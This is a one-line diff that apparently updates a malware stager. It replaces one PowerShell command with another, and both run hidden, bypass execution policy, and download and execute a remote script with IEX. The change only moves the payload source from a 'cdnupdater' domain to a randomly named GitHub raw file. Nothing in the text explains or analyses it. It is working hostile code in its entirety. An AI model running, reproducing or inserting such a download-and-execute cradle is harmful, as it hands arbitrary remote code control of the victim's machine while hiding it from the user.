@@ -1,1 +1,1 @@
-powershell -w hidden -exec bypass -nop -c "IEX ((new-object net.webclient).downloadstring('https://v13cdn.com/cdnupdater'))"
+powershell -w hidden -exec bypass -nop -c "IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/kjsWIjIwCjvnwN3YEiKB/noesfnbfoes/master/gerrsgrdsh.txt'))"
